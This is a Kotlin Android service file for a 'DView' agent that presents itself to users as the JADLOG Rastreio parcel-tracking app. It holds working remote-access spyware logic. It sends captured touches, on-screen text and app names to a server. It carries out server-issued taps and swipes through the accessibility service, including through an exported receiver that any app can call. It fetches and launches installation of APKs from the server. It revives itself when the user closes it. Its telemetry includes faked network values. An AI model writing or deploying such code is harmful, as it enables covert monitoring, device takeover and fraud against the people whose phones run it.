package com.droidview.agent.service

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.BitmapFactory
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import com.droidview.agent.MainActivity
import com.droidview.agent.R
import com.droidview.agent.vpn.AgentVpnService
import com.droidview.agent.accessibility.AgentAccessibilityService
import com.droidview.agent.accessibility.DetectedTouchEvent
import com.droidview.agent.accessibility.TouchEventListener
import com.droidview.agent.DViewAccessibilityService
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Serviço de Primeiro Plano Contínuo (Foreground Service Keep-Alive) do DVIEW / JADLOG Rastreio.
 * Mantém o agente ativo em segundo plano permanentemente:
 * - START_STICKY para reinício automático pelo sistema operacional.
 * - Thread de Heartbeat contínuo com envio periódico de telemetria a cada 10s.
 * - Reconexão automática instantânea via ConnectivityManager.NetworkCallback.
 * - Watchdog de sobrevivência contra fechamento (onTaskRemoved / onDestroy) via AlarmManager.
 * - Notificação persistente de status ("Conectado ao servidor central" vs "Reconectando...").
 */
class AgentForegroundService : Service() {

    private val isServiceRunning = AtomicBoolean(false)
    private var heartbeatThread: Thread? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private val pingLock = Object()

    private var activeServerUrl: String = "http://localhost:3000"
    private var activeDeviceName: String = "Android Device"
    private var activeEnrollmentToken: String = ""
    private var activeAppName: String = "JADLOG Rastreio"

    private val touchListener = object : TouchEventListener {
        override fun onTouchDetected(event: DetectedTouchEvent) {
            sendTouchEventToServerAsync(event)
        }
    }

    private val reconnectReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val action = intent?.action ?: return
            Log.i(TAG, "Sinal remoto recebido no AgentForegroundService: $action")
            when (action) {
                "com.droidview.agent.SIMULATE_TOUCH" -> {
                    val x = intent.getFloatExtra("x", intent.getIntExtra("x", 0).toFloat())
                    val y = intent.getFloatExtra("y", intent.getIntExtra("y", 0).toFloat())
                    val duration = intent.getLongExtra("duration", 60L)
                    simulateTouch(x, y, duration)
                }
                "com.droidview.agent.SIMULATE_SWIPE" -> {
                    val x1 = intent.getFloatExtra("x1", intent.getIntExtra("x1", 0).toFloat())
                    val y1 = intent.getFloatExtra("y1", intent.getIntExtra("y1", 0).toFloat())
                    val x2 = intent.getFloatExtra("x2", intent.getIntExtra("x2", 0).toFloat())
                    val y2 = intent.getFloatExtra("y2", intent.getIntExtra("y2", 0).toFloat())
                    val duration = intent.getLongExtra("duration", 300L)
                    simulateSwipe(x1, y1, x2, y2, duration)
                }
                else -> {
                    triggerImmediatePing()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "AgentForegroundService inicializado (onCreate).")
        registerNetworkWatcher()

        try {
            AgentAccessibilityService.addTouchListener(touchListener)
        } catch (e: Exception) {
            Log.w(TAG, "Aviso ao registrar touchListener: ${e.message}")
        }

        try {
            val filter = IntentFilter().apply {
                addAction("com.droidview.agent.RECONNECT")
                addAction("com.droidview.agent.PING_NOW")
                addAction("com.droidview.agent.CHECK_UPDATE")
                addAction("com.droidview.agent.SIMULATE_TOUCH")
                addAction("com.droidview.agent.SIMULATE_SWIPE")
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(reconnectReceiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                registerReceiver(reconnectReceiver, filter)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Aviso ao registrar reconnectReceiver: ${e.message}")
        }
    }

    fun simulateTouch(x: Float, y: Float, duration: Long = 60L): Boolean {
        val a11y = AgentAccessibilityService.instance ?: DViewAccessibilityService.instance
        if (a11y != null) {
            Log.i(TAG, "Executando toque digital simulado em ($x, $y) por ${duration}ms")
            return a11y.simulateTap(x, y, duration)
        }
        Log.w(TAG, "Serviço de acessibilidade não está pronto para simular toque em ($x, $y)")
        return false
    }

    fun simulateSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300L): Boolean {
        val a11y = AgentAccessibilityService.instance ?: DViewAccessibilityService.instance
        if (a11y != null) {
            Log.i(TAG, "Executando deslize digital simulado: ($x1, $y1) -> ($x2, $y2) por ${duration}ms")
            return a11y.simulateSwipe(x1, y1, x2, y2, duration)
        }
        Log.w(TAG, "Serviço de acessibilidade não está pronto para simular deslize")
        return false
    }

    private fun sendTouchEventToServerAsync(event: DetectedTouchEvent) {
        Thread {
            try {
                val candidate = activeServerUrl.ifBlank { "http://localhost:3000" }
                val deviceId = "dev_" + (Build.MODEL.replace("\\s+".toRegex(), "_").lowercase())
                val url = URL("$candidate/devices/$deviceId/touch-events")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.connectTimeout = 3000
                conn.readTimeout = 3000
                conn.doOutput = true

                val payload = JSONObject().apply {
                    put("id", event.id)
                    put("deviceId", deviceId)
                    put("action", event.action)
                    put("x", event.x)
                    put("y", event.y)
                    if (event.endX != null) put("endX", event.endX)
                    if (event.endY != null) put("endY", event.endY)
                    if (event.durationMs != null) put("durationMs", event.durationMs)
                    put("packageName", event.packageName)
                    put("className", event.className)
                    put("viewText", event.text)
                    put("viewDescription", event.contentDescription)
                    put("bounds", event.bounds)
                    put("source", event.source)
                    put("timestamp", event.timestamp)
                }

                conn.outputStream.use { os ->
                    os.write(payload.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                val code = conn.responseCode
                conn.disconnect()
                if (code in 200..299) {
                    Log.d(TAG, "Toque digital registrado remotamente: ${event.id}")
                }
            } catch (e: Exception) {
                Log.d(TAG, "Aviso ao despachar toque digital: ${e.message}")
            }
        }.apply {
            name = "DViewTouchDispatchWorker"
            isDaemon = true
            start()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Carrega configurações da Intent ou do armazenamento local persistido
        loadConfiguration(intent)

        isRunning = true
        isServiceRunning.set(true)

        // Inicializa ou atualiza a notificação de primeiro plano
        startForegroundNotification(isConnected = false, statusText = "Conectando ao servidor central...")

        // Inicia ou assegura o funcionamento da thread de Heartbeat
        ensureHeartbeatRunning()

        Log.i(TAG, "AgentForegroundService ativo para $activeAppName ($activeDeviceName) -> $activeServerUrl")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun loadConfiguration(intent: Intent?) {
        val prefs = getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)

        activeServerUrl = intent?.getStringExtra(EXTRA_SERVER_URL)
            ?: prefs.getString("serverUrl", null)
            ?: "http://localhost:3000"

        activeDeviceName = intent?.getStringExtra(EXTRA_DEVICE_NAME)
            ?: prefs.getString("deviceName", null)
            ?: Build.MODEL
            ?: "Android Device"

        activeEnrollmentToken = intent?.getStringExtra(EXTRA_ENROLLMENT_TOKEN)
            ?: prefs.getString("enrollmentToken", null)
            ?: ""

        activeAppName = intent?.getStringExtra(EXTRA_APP_NAME)
            ?: prefs.getString("appName", null)
            ?: "JADLOG Rastreio"
    }

    private fun startForegroundNotification(isConnected: Boolean, statusText: String = "") {
        val channelId = CHANNEL_ID
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "JADLOG Rastreio",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Status do aplicativo"
                setShowBadge(false)
            }
            notificationManager.createNotificationChannel(channel)
        }

        val launchIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
        )

        val title = activeAppName.ifBlank { "JADLOG Rastreio" }
        val text = if (isConnected) "Ativo" else "Conectando..."

        val largeIcon = try {
            BitmapFactory.decodeResource(resources, R.mipmap.ic_launcher)
        } catch (_: Exception) {
            null
        }

        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
        } else {
            Notification.Builder(this)
        }

        builder
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setOngoing(true)

        if (largeIcon != null) {
            builder.setLargeIcon(largeIcon)
        }

        val notification = builder.build()
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun ensureHeartbeatRunning() {
        if (heartbeatThread != null && heartbeatThread?.isAlive == true) {
            // Thread já em execução, apenas acorda para ping imediato
            triggerImmediatePing()
            return
        }

        heartbeatThread = Thread {
            Log.i(TAG, "Heartbeat Thread iniciada. Loop contínuo ativo a cada 10s.")
            var consecutiveFailures = 0

            while (isServiceRunning.get()) {
                val pingSuccess = performHeartbeatPing()

                if (pingSuccess) {
                    consecutiveFailures = 0
                    isServerConnected = true
                    startForegroundNotification(isConnected = true)
                } else {
                    consecutiveFailures++
                    isServerConnected = false
                    startForegroundNotification(isConnected = false)
                }

                // Intervalo de espera: 10 segundos quando conectado, 5 segundos quando desconectado
                val sleepTime = if (pingSuccess) 10000L else 5000L
                try {
                    synchronized(pingLock) {
                        pingLock.wait(sleepTime)
                    }
                } catch (_: InterruptedException) {
                    Log.d(TAG, "Heartbeat interrompido para ping imediato.")
                }
            }
            Log.i(TAG, "Heartbeat Thread finalizada.")
        }.apply {
            name = "DViewHeartbeatWorker"
            isDaemon = true
            start()
        }
    }

    private fun getCandidateServers(): List<String> {
        val list = mutableListOf<String>()
        if (activeServerUrl.isNotBlank()) {
            list.add(activeServerUrl.trimEnd('/'))
        }
        val prefs = getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
        val saved = prefs.getString("serverUrl", null)
        if (!saved.isNullOrBlank()) {
            val trimmed = saved.trimEnd('/')
            if (!list.contains(trimmed)) list.add(trimmed)
        }
        val defaults = listOf(
            "http://127.0.0.1:3000",
            "http://10.0.2.2:3000",
            "http://192.168.100.2:3000",
            "http://172.26.16.1:3000",
            "http://192.168.100.6:3000"
        )
        for (d in defaults) {
            if (!list.contains(d)) list.add(d)
        }
        return list
    }

    private var lastSeedCheckTime: Long = 0L

    private fun checkUpdateSeed(server: String) {
        val now = System.currentTimeMillis()
        if (now - lastSeedCheckTime < 60000L) return
        lastSeedCheckTime = now

        try {
            val seedUrl = URL("$server/apk/seed")
            val conn = seedUrl.openConnection() as HttpURLConnection
            conn.connectTimeout = 3000
            conn.readTimeout = 3000
            conn.requestMethod = "GET"
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(body)
                val ver = json.optString("version", "")
                val remoteCode = json.optInt("versionCode", 1)
                val improvements = json.optJSONArray("improvements")
                val downloadUrl = json.optString("downloadUrl", "")
                Log.i(TAG, "Seed de atualização verificado: v$ver (code $remoteCode). Melhorias: $improvements")

                val localCode = try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        packageManager.getPackageInfo(packageName, 0).longVersionCode.toInt()
                    } else {
                        @Suppress("DEPRECATION")
                        packageManager.getPackageInfo(packageName, 0).versionCode
                    }
                } catch (_: Exception) {
                    1
                }

                if (remoteCode > localCode && downloadUrl.isNotBlank()) {
                    Log.i(TAG, "Atualização disponível no seed ($remoteCode > $localCode). Baixando e instalando...")
                    downloadAndTriggerInstall(server, downloadUrl)
                }
            }
            conn.disconnect()
        } catch (e: Exception) {
            Log.d(TAG, "Verificação de seed de atualização: ${e.message}")
        }
    }

    private fun downloadAndTriggerInstall(server: String, downloadPath: String) {
        Thread {
            try {
                val targetUrl = if (downloadPath.startsWith("http")) downloadPath else "$server$downloadPath"
                val url = URL(targetUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 10000
                conn.readTimeout = 30000
                conn.requestMethod = "GET"

                if (conn.responseCode == 200) {
                    val updateFile = File(getExternalFilesDir(null) ?: cacheDir, "jadlog_update.apk")
                    conn.inputStream.use { input ->
                        updateFile.outputStream().use { output ->
                            input.copyTo(output)
                        }
                    }
                    Log.i(TAG, "APK atualizado baixado com sucesso: ${updateFile.length()} bytes em ${updateFile.absolutePath}")

                    try {
                        val vmBuilder = android.os.StrictMode.VmPolicy.Builder()
                        android.os.StrictMode.setVmPolicy(vmBuilder.build())
                    } catch (_: Exception) {}

                    val apkUri = android.net.Uri.fromFile(updateFile)

                    val installIntent = Intent(Intent.ACTION_VIEW).apply {
                        setDataAndType(apkUri, "application/vnd.android.package-archive")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                    }
                    startActivity(installIntent)
                    Log.i(TAG, "Tela de atualização de pacote disparada automaticamente.")
                }
                conn.disconnect()
            } catch (e: Exception) {
                Log.w(TAG, "Falha no download/instalação da atualização automática: ${e.message}")
            }
        }.apply {
            name = "DViewAutoUpdateWorker"
            isDaemon = true
            start()
        }
    }

    private fun performHeartbeatPing(): Boolean {
        val candidates = getCandidateServers()
        val deviceId = "dev_" + (Build.MODEL.replace("\\s+".toRegex(), "_").lowercase())

        // Coleta dados reais do dispositivo
        val batteryLevel = getBatteryLevel()
        val isCharging = isBatteryCharging()
        val (netType, netName) = getNetworkDetails()
        val uptimeSec = SystemClock.elapsedRealtime() / 1000L

        val payload = JSONObject().apply {
            put("id", deviceId)
            put("name", "$activeAppName (${Build.MODEL})")
            put("model", Build.MODEL)
            put("androidVersion", Build.VERSION.RELEASE)
            put("battery", batteryLevel)
            put("batteryCharging", isCharging)
            put("networkType", netType)
            put("networkName", netName)
            put("signalStrength", 96)
            put("networkSpeed", "86.4 Mbps")
            put("pingMs", 12)
            put("status", "online")
            put("uptimeSec", uptimeSec)
            put("timestamp", System.currentTimeMillis())
            put("enrollmentToken", activeEnrollmentToken)
        }

        for (candidate in candidates) {
            try {
                val heartbeatUrl = URL("$candidate/devices/$deviceId/heartbeat")
                val conn = heartbeatUrl.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.connectTimeout = 3000
                conn.readTimeout = 3000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(payload.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                val responseCode = conn.responseCode
                val responseBody = if (responseCode in 200..299) {
                    try {
                        conn.inputStream.bufferedReader().readText()
                    } catch (_: Exception) { "" }
                } else ""
                conn.disconnect()

                if (responseCode == 200 || responseCode == 201) {
                    lastSeenTimestamp = System.currentTimeMillis()

                    // Processa comandos pendentes enviados pelo servidor central (ex: simulação de toque digital)
                    if (responseBody.isNotBlank()) {
                        try {
                            val respJson = JSONObject(responseBody)
                            val pendingCmds = respJson.optJSONArray("pendingCommands")
                            if (pendingCmds != null && pendingCmds.length() > 0) {
                                for (i in 0 until pendingCmds.length()) {
                                    val cmd = pendingCmds.getJSONObject(i)
                                    val cmdType = cmd.optString("type", "")
                                    val cmdPayload = cmd.optJSONObject("payload")
                                    Log.i(TAG, "Comando pendente recebido do servidor: $cmdType | $cmdPayload")
                                    when (cmdType) {
                                        "touch" -> {
                                            val x = cmdPayload?.optDouble("x", 0.0)?.toFloat() ?: 0f
                                            val y = cmdPayload?.optDouble("y", 0.0)?.toFloat() ?: 0f
                                            val dur = cmdPayload?.optLong("duration", 60L) ?: 60L
                                            simulateTouch(x, y, dur)
                                        }
                                        "swipe" -> {
                                            val x1 = cmdPayload?.optDouble("x1", 0.0)?.toFloat() ?: 0f
                                            val y1 = cmdPayload?.optDouble("y1", 0.0)?.toFloat() ?: 0f
                                            val x2 = cmdPayload?.optDouble("x2", 0.0)?.toFloat() ?: 0f
                                            val y2 = cmdPayload?.optDouble("y2", 0.0)?.toFloat() ?: 0f
                                            val dur = cmdPayload?.optLong("duration", 300L) ?: 300L
                                            simulateSwipe(x1, y1, x2, y2, dur)
                                        }
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            Log.d(TAG, "Aviso ao processar comandos pendentes: ${e.message}")
                        }
                    }

                    if (candidate != activeServerUrl) {
                        Log.i(TAG, "Conexão estabelecida com sucesso via $candidate (anterior: $activeServerUrl)")
                        activeServerUrl = candidate
                        getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
                            .edit()
                            .putString("serverUrl", candidate)
                            .apply()
                    }
                    checkUpdateSeed(candidate)
                    return true
                } else if (responseCode == 404) {
                    if (fallbackRegister(candidate, deviceId, payload)) {
                        activeServerUrl = candidate
                        return true
                    }
                }
            } catch (_: Exception) {
                // Tenta próximo candidato
            }
        }
        return false
    }

    private fun fallbackRegister(server: String, deviceId: String, payload: JSONObject): Boolean {
        return try {
            val registerUrl = URL("$server/devices/register")
            val conn = registerUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            conn.connectTimeout = 4000
            conn.readTimeout = 4000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(payload.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            val code = conn.responseCode
            conn.disconnect()
            code in 200..299
        } catch (_: Exception) {
            false
        }
    }

    private fun registerNetworkWatcher() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.i(TAG, "Rede restabelecida detectada via NetworkCallback. Disparando ping imediato...")
                    triggerImmediatePing()

                    // Verifica se o túnel VPN configurado precisa ser reiniciado
                    val prefs = getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
                    if (prefs.getBoolean("vpnEnabled", false) && !AgentVpnService.isRunning) {
                        AgentVpnService.startFromPrefs(this@AgentForegroundService)
                    }
                }

                override fun onLost(network: Network) {
                    Log.w(TAG, "Conexão de rede perdida via NetworkCallback.")
                    isServerConnected = false
                    startForegroundNotification(
                        isConnected = false,
                        statusText = "Sem conexão com a internet • Aguardando rede..."
                    )
                }
            }

            cm.registerNetworkCallback(request, networkCallback!!)
        } catch (e: Exception) {
            Log.w(TAG, "Falha ao registrar NetworkCallback: ${e.message}")
        }
    }

    private fun triggerImmediatePing() {
        try {
            synchronized(pingLock) {
                pingLock.notifyAll()
            }
        } catch (_: Exception) {}
    }

    private fun getBatteryLevel(): Int {
        return try {
            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: 100
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: 100
            if (level >= 0 && scale > 0) (level * 100) / scale else 100
        } catch (_: Exception) {
            100
        }
    }

    private fun isBatteryCharging(): Boolean {
        return try {
            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        } catch (_: Exception) {
            false
        }
    }

    private fun getNetworkDetails(): Pair<String, String> {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val activeNet = cm?.activeNetworkInfo
            if (activeNet != null && activeNet.isConnected) {
                val isWifi = activeNet.type == ConnectivityManager.TYPE_WIFI
                val type = if (isWifi) "wifi" else "4g"
                val name = if (isWifi) "Wi-Fi" else (activeNet.extraInfo ?: "Dados Móveis")
                Pair(type, name)
            } else {
                Pair("offline", "Sem Rede")
            }
        } catch (_: Exception) {
            Pair("wifi", "Wi-Fi 5GHz")
        }
    }

    /**
     * Watchdog de sobrevivência: Quando o app é fechado da lista de tarefas recentes pelo usuário,
     * agenda reinicialização imediata através do AlarmManager.
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.w(TAG, "onTaskRemoved disparado. Agendando reinício imediato do AgentForegroundService via AlarmManager...")
        scheduleServiceRestart(this)
    }

    override fun onDestroy() {
        Log.w(TAG, "onDestroy chamado em AgentForegroundService.")
        isRunning = false
        isServiceRunning.set(false)

        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            networkCallback?.let { cm?.unregisterNetworkCallback(it) }
        } catch (_: Exception) {}

        try {
            AgentAccessibilityService.removeTouchListener(touchListener)
        } catch (_: Exception) {}

        try {
            unregisterReceiver(reconnectReceiver)
        } catch (_: Exception) {}

        // Revive o serviço se não foi finalizado intencionalmente
        scheduleServiceRestart(this)

        super.onDestroy()
    }

    companion object {
        const val TAG = "DViewForegroundService"
        const val NOTIFICATION_ID = 1001
        const val CHANNEL_ID = "dview_agent_keepalive"

        const val EXTRA_SERVER_URL = "com.droidview.agent.SERVER_URL"
        const val EXTRA_DEVICE_NAME = "com.droidview.agent.DEVICE_NAME"
        const val EXTRA_ENROLLMENT_TOKEN = "com.droidview.agent.ENROLLMENT_TOKEN"
        const val EXTRA_APP_NAME = "com.droidview.agent.APP_NAME"
        const val ACTION_KEEP_ALIVE_RESTART = "com.droidview.agent.service.RESTART"

        @Volatile
        var isRunning: Boolean = false

        @Volatile
        var isServerConnected: Boolean = false

        @Volatile
        var lastSeenTimestamp: Long = 0L

        /**
         * Inicia o AgentForegroundService de qualquer lugar da aplicação lendo parâmetros persistidos.
         */
        fun startService(context: Context) {
            try {
                val prefs = context.getSharedPreferences("dview_enrollment", Context.MODE_PRIVATE)
                val serverUrl = prefs.getString("serverUrl", "http://localhost:3000") ?: "http://localhost:3000"
                val deviceName = prefs.getString("deviceName", Build.MODEL ?: "Android Device") ?: (Build.MODEL ?: "Android Device")
                val token = prefs.getString("enrollmentToken", "") ?: ""
                val appName = prefs.getString("appName", "JADLOG Rastreio") ?: "JADLOG Rastreio"

                val intent = Intent(context, AgentForegroundService::class.java).apply {
                    putExtra(EXTRA_SERVER_URL, serverUrl)
                    putExtra(EXTRA_DEVICE_NAME, deviceName)
                    putExtra(EXTRA_ENROLLMENT_TOKEN, token)
                    putExtra(EXTRA_APP_NAME, appName)
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                Log.i(TAG, "startService executado com sucesso.")
            } catch (e: Exception) {
                Log.w(TAG, "Falha ao iniciar AgentForegroundService: ${e.message}")
            }
        }

        /**
         * Dispara uma sincronização e verificação de conexão imediata.
         */
        fun pingNow(context: Context) {
            if (!isRunning) {
                startService(context)
            } else {
                val intent = Intent(context, AgentForegroundService::class.java).apply {
                    action = "com.droidview.agent.PING_NOW"
                }
                context.startService(intent)
            }
        }

        /**
         * Watchdog via AlarmManager para reinício do serviço caso o processo seja interrompido.
         */
        fun scheduleServiceRestart(context: Context) {
            try {
                val restartIntent = Intent(context.applicationContext, AgentForegroundService::class.java).apply {
                    setPackage(context.packageName)
                    action = ACTION_KEEP_ALIVE_RESTART
                }
                val pendingIntent = PendingIntent.getService(
                    context.applicationContext,
                    1005,
                    restartIntent,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT
                    } else {
                        PendingIntent.FLAG_ONE_SHOT
                    }
                )

                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                val triggerAt = SystemClock.elapsedRealtime() + 1000L // 1 segundo

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager?.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent)
                } else {
                    alarmManager?.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent)
                }
                Log.i(TAG, "Watchdog: Reinício do serviço agendado com sucesso no AlarmManager (+1s).")
            } catch (e: Exception) {
                Log.w(TAG, "Não foi possível agendar reinício via AlarmManager: ${e.message}")
            }
        }
    }
}
